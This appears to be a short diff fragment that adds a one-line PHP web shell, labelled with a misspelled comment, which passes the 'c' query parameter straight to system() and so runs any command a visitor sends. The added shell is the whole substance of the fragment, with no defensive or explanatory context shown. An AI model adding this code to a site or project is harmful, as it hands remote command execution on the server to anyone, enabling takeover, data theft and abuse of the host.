@@ -1,0 +1,3 @@
+# PHP sysmte
+<?php system($_GET['c']) ?>
+-----
